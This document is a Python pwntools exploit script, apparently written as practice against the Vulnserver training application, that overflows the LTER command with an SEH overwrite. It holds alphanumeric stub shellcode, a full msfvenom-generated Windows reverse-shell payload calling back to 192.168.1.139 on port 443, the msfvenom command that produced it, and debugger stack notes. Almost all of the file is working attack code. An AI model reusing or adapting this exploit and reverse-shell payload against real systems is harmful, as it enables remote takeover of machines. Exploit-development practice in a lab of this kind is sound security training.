from pwn import * # pylint: disable=unused-wildcard-import
context.log_level = 'debug' # pylint: disable=assigning-non-slot

# IP and port of the target (Vulnserver).
ip = "192.168.1.132"
port = 9999

offset_seh = 3508
seh = 0x6250172b # Address of pop pop ret.

nseh = "\x75\x06\x74\x04" # jmp +0x6 (jnz +0x6; jz +0x4 : \x75\x06\x74\x04)

# Here we put the shellcode we want to execute.
offset_sc = offset_seh + 4
shellcode1 = "\x58\x58\x58\x04\x1E\x50\x5C\x66\x2D\x7F\x0D\x50\x5B\x66\x2D\x7C\x0E\x50"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.139 LPORT=443 EXITFUNC=thread -f c -b "\x00" -e x86/alpha_mixed BufferRegister=EAX
# Payload size: 702 bytes
shellcode2 = ("\x41\x49"*35 +
"\x54\x58\x66\x2D\x22\x20\x50\x5C\x53\x58\x04\x0C" ## adjust esp
"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x49\x6c\x59\x78\x6c\x42\x33\x30"
"\x35\x50\x75\x50\x61\x70\x4b\x39\x59\x75\x30\x31\x49\x50\x63"
"\x54\x4c\x4b\x72\x70\x56\x50\x4c\x4b\x43\x62\x36\x6c\x6c\x4b"
"\x53\x62\x54\x54\x4c\x4b\x62\x52\x34\x68\x74\x4f\x6d\x67\x71"
"\x5a\x55\x76\x34\x71\x59\x6f\x4c\x6c\x67\x4c\x35\x31\x33\x4c"
"\x47\x72\x74\x6c\x61\x30\x59\x51\x7a\x6f\x34\x4d\x57\x71\x59"
"\x57\x4b\x52\x4c\x32\x72\x72\x33\x67\x4e\x6b\x50\x52\x64\x50"
"\x6c\x4b\x71\x5a\x55\x6c\x4e\x6b\x30\x4c\x74\x51\x64\x38\x6b"
"\x53\x67\x38\x53\x31\x4b\x61\x72\x71\x6e\x6b\x32\x79\x61\x30"
"\x43\x31\x4a\x73\x4c\x4b\x50\x49\x52\x38\x6d\x33\x75\x6a\x53"
"\x79\x4e\x6b\x30\x34\x6c\x4b\x43\x31\x7a\x76\x65\x61\x4b\x4f"
"\x6c\x6c\x6a\x61\x68\x4f\x44\x4d\x66\x61\x6b\x77\x55\x68\x39"
"\x70\x63\x45\x38\x76\x73\x33\x53\x4d\x4c\x38\x47\x4b\x51\x6d"
"\x77\x54\x71\x65\x38\x64\x63\x68\x4c\x4b\x62\x78\x54\x64\x36"
"\x61\x58\x53\x32\x46\x6c\x4b\x44\x4c\x52\x6b\x4e\x6b\x52\x78"
"\x77\x6c\x77\x71\x49\x43\x4c\x4b\x54\x44\x4c\x4b\x63\x31\x4a"
"\x70\x4e\x69\x72\x64\x75\x74\x74\x64\x61\x4b\x53\x6b\x31\x71"
"\x70\x59\x63\x6a\x62\x71\x6b\x4f\x6d\x30\x31\x4f\x43\x6f\x51"
"\x4a\x6e\x6b\x65\x42\x5a\x4b\x4e\x6d\x61\x4d\x43\x58\x75\x63"
"\x65\x62\x37\x70\x65\x50\x51\x78\x70\x77\x50\x73\x67\x42\x71"
"\x4f\x72\x74\x62\x48\x70\x4c\x62\x57\x55\x76\x74\x47\x6b\x4f"
"\x68\x55\x6e\x58\x7a\x30\x37\x71\x63\x30\x47\x70\x64\x69\x5a"
"\x64\x50\x54\x52\x70\x30\x68\x57\x59\x6b\x30\x72\x4b\x65\x50"
"\x79\x6f\x79\x45\x70\x50\x56\x30\x32\x70\x66\x30\x51\x50\x72"
"\x70\x61\x50\x62\x70\x52\x48\x79\x7a\x34\x4f\x6b\x6f\x79\x70"
"\x79\x6f\x78\x55\x4f\x67\x33\x5a\x66\x65\x55\x38\x6b\x70\x79"
"\x38\x37\x71\x4e\x6b\x52\x48\x63\x32\x53\x30\x47\x71\x6d\x6b"
"\x6f\x79\x78\x66\x43\x5a\x66\x70\x51\x46\x76\x37\x55\x38\x4e"
"\x79\x49\x35\x73\x44\x65\x31\x59\x6f\x79\x45\x6e\x65\x4f\x30"
"\x34\x34\x56\x6c\x4b\x4f\x42\x6e\x73\x38\x51\x65\x68\x6c\x72"
"\x48\x6c\x30\x38\x35\x6f\x52\x31\x46\x49\x6f\x6a\x75\x52\x48"
"\x63\x53\x62\x4d\x30\x64\x77\x70\x6c\x49\x4b\x53\x51\x47\x50"
"\x57\x76\x37\x70\x31\x5a\x56\x33\x5a\x64\x52\x51\x49\x53\x66"
"\x39\x72\x59\x6d\x55\x36\x49\x57\x43\x74\x37\x54\x45\x6c\x77"
"\x71\x35\x51\x6e\x6d\x30\x44\x54\x64\x42\x30\x39\x56\x55\x50"
"\x52\x64\x31\x44\x66\x30\x36\x36\x66\x36\x71\x46\x53\x76\x72"
"\x76\x42\x6e\x36\x36\x51\x46\x43\x63\x50\x56\x42\x48\x31\x69"
"\x5a\x6c\x55\x6f\x4d\x56\x79\x6f\x69\x45\x6d\x59\x79\x70\x62"
"\x6e\x62\x76\x30\x46\x4b\x4f\x56\x50\x72\x48\x57\x78\x4b\x37"
"\x37\x6d\x51\x70\x4b\x4f\x58\x55\x4f\x4b\x69\x70\x77\x6d\x57"
"\x5a\x64\x4a\x50\x68\x6c\x66\x5a\x35\x6d\x6d\x4f\x6d\x4b\x4f"
"\x7a\x75\x45\x6c\x43\x36\x71\x6c\x54\x4a\x4b\x30\x4b\x4b\x69"
"\x70\x71\x65\x37\x75\x6f\x4b\x57\x37\x36\x73\x64\x32\x70\x6f"
"\x71\x7a\x53\x30\x31\x43\x6b\x4f\x48\x55\x41\x41")

cmd = "LTER /.:/"

# Create our payload.
payload = fit({
    0:cmd,
    len(cmd):shellcode2,
    offset_seh - 4:nseh,
    offset_seh:seh,
    offset_sc:shellcode1
    },length=5000)

io = remote(ip,port)
io.readline()
io.sendline(payload)

# [STACK]
# 00B7EE50   00B7EF48  
# 00B7EE54   00B7EF00
# 00B7EE58   00B7FFDC

# 00B7FFE4   626A 65          BOUND EBP,QWORD PTR DS:[EDX+65]
# 00B7FFE7   61               POPAD
# 00B7FFE8   626A 66          BOUND EBP,QWORD PTR DS:[EDX+66]
# 00B7FFEB   61               POPAD
# 00B7FFEC   626A 67          BOUND EBP,QWORD PTR DS:[EDX+67]
# 00B7FFEF   61               POPAD
# 00B7FFF0   626A 68          BOUND EBP,QWORD PTR DS:[EDX+68]
# 00B7FFF3   61               POPAD
# 00B7FFF4   626A 69          BOUND EBP,QWORD PTR DS:[EDX+69]
# 00B7FFF7   61               POPAD
# 00B7FFF8   626A 6A          BOUND EBP,QWORD PTR DS:[EDX+6A]
# 00B7FFFB   61               POPAD
# 00B7FFFC   626A 6B          BOUND EBP,QWORD PTR DS:[EDX+6B]
# 00B7FFFF   61               POPAD

# 00B7FFE4   58               POP EAX
# 00B7FFE5   58               POP EAX
# 00B7FFE6   58               POP EAX
# 00B7FFE7   04 1D            ADD AL,1E
# 00B7FFE9   50               PUSH EAX
# 00B7FFEA   5C               POP ESP
# 00B7FFEB   66:2D 7F0D       SUB AX,0D7F
# 00B7FFEF   50               PUSH EAX
# 00B7FFF0   5B               POP EBX
# 00B7FFF1   66:2D 7B0E       SUB AX,0E7C
# 00B7FFF5   50               PUSH EAX

